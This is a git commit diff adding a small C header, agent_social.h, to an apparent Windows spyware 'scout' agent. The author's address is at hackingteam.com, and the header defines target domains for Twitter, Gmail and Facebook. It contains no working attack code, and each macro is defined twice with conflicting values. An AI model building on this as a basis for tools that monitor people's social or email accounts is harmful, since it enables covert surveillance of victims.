3f6da697f86bb2130f328040ebbc6d8546603a7f
Guido Landi <g.landi@hackingteam.com>
2013-11-21 18:00:18 +0100

    missing files

---
+++ core-scout-win32/agent_social.h
@@ -0,0 +1,12 @@
+#ifndef _AGENT_SOCIAL
+#define _AGENT_SOCIAL
+
+#define TWITTER_DOMAIN L"twitter.com"
+#define GMAIL_DOMAIN L"mail.google.com"
+#define FACEBOOK_DOMAIN L"facebook.com"
+
+#define TWITTER_DOMAIN "twitter.com"
+#define GMAIL_DOMAIN "mail.google.com"
+#define FACEBOOK_DOMAIN "facebook.com"
+
+#endif // _AGENT_SOCIAL
